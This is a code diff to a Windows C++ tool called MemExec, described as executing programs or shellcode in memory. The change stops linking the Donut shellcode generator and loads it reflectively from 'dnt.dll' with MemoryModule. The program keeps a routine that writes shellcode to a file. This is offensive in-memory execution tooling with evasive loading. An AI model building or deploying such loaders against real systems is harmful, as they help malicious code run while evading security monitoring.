@@ -1,19 +1,125 @@
-// pisc_exec.cpp : This file contains the 'main' function. Program execution begins and ends there.
+// memexec.cpp : This file contains the 'main' function. Program execution begins and ends there.
 //
+#define WIN32_LEAN_AND_MEAN
+#ifndef _CRT_SECURE_NO_WARNINGS
+#define _CRT_SECURE_NO_WARNINGS
+#endif
 
 #include "HTTPRequest.hpp"
 #include "cxxopts.hpp"
 
 #include <iostream>
+#include <assert.h>
+#include <tchar.h>
+#include <stdio.h>
+#include <malloc.h>
 #include <Windows.h>
 #include <String.h>
 #include <donut.h>
+#include "MemoryModule.h"
 #include <fstream>
 
 using namespace std;
 
 #pragma comment (lib, "Ws2_32.lib")
-#pragma comment (lib, "donut.lib")
+
+typedef int (*donutCreate)(PDONUT_CONFIG);
+typedef int (*donutDelete)(PDONUT_CONFIG);
+typedef int (*donutError)(int);
+
+#define DLL_FILE TEXT("dnt.dll")
+
+
+void* ReadLibrary(size_t* pSize) {
+    size_t read;
+    void* result;
+    FILE* fp;
+
+    fp = _tfopen(DLL_FILE, _T("rb"));
+    if (fp == NULL)
+    {
+        _tprintf(_T("Can't open DLL file \"%s\"."), DLL_FILE);
+        return NULL;
+    }
+
+    fseek(fp, 0, SEEK_END);
+    *pSize = static_cast<size_t>(ftell(fp));
+    if (*pSize == 0)
+    {
+        fclose(fp);
+        return NULL;
+    }
+
+    result = (unsigned char*)malloc(*pSize);
+    if (result == NULL)
+    {
+        return NULL;
+    }
+
+    fseek(fp, 0, SEEK_SET);
+    read = fread(result, 1, *pSize, fp);
+    fclose(fp);
+    if (read != *pSize)
+    {
+        free(result);
+        return NULL;
+    }
+
+    return result;
+}
+
+void LoadFromMemory(void)
+{
+    void* data;
+    size_t size;
+    HMEMORYMODULE handle;
+    donutCreate DonutCreate;
+    donutDelete DonutDelete;
+    donutError DonutError;
+    
+
+    data = ReadLibrary(&size);
+    if (data == NULL)
+    {
+        return;
+    }
+
+    handle = MemoryLoadLibrary(data, size);
+    if (handle == NULL)
+    {
+        _tprintf(_T("Can't load library from memory.\n"));
+        goto exit;
+    }
+
+    DonutCreate = (donutCreate)MemoryGetProcAddress(handle, "DonutCreate");
+    
+    DonutDelete = (donutDelete)MemoryGetProcAddress(handle, "DonutDelete");
+
+    DonutError = (donutError)MemoryGetProcAddress(handle, "DonutError");
+    
+    MemoryFreeLibrary(handle);
+
+exit:
+    free(data);
+}
+
+
+#ifdef _WIN64
+
+LPVOID MemoryAllocHigh(LPVOID address, SIZE_T size, DWORD allocationType, DWORD protect, void* userdata)
+{
+    int* counter = static_cast<int*>(userdata);
+    if (*counter == 0) {
+        // Make sure the image gets loaded to an address above 32bit.
+        uintptr_t offset = 0x10000000000;
+        address = (LPVOID)((uintptr_t)address + offset);
+    }
+    (*counter)++;
+    return MemoryDefaultAlloc(address, size, allocationType, protect, NULL);
+}
+
+#endif  // _WIN64
+
 
 static void write_shellcode_to_file(const void* object, size_t size, string outfile) {
 #ifdef __cplusplus
@@ -50,7 +156,33 @@ int main(int argc, char* argv[]) {
     DONUT_CONFIG c;
     int          err;
 
+    void* data;
+    size_t size;
+    HMEMORYMODULE handle;
+    donutCreate DonutCreate;
+    donutDelete DonutDelete;
+    donutError DonutError;
     
+    data = ReadLibrary(&size);
+    if (data == NULL)
+    {
+        return 0;
+    }
+
+    handle = MemoryLoadLibrary(data, size);
+    if (handle == NULL)
+    {
+        _tprintf(_T("Can't load library from memory.\n"));
+        free(data);
+        return 0;
+    }
+
+    DonutCreate = (donutCreate)MemoryGetProcAddress(handle, "DonutCreate");
+
+    DonutDelete = (donutDelete)MemoryGetProcAddress(handle, "DonutDelete");
+
+    DonutError = (donutError)MemoryGetProcAddress(handle, "DonutError");
+
     //parse arguments
     cxxopts::Options options("MemExec.exe", "Execute Program/ShellCode in memory.");
     options.positional_help("[optional args]").show_positional_help();
@@ -194,6 +326,9 @@ int main(int argc, char* argv[]) {
         std::exit(0);
     }
 
+    MemoryFreeLibrary(handle);
+
+    free(data);
     return 0;
 
 }
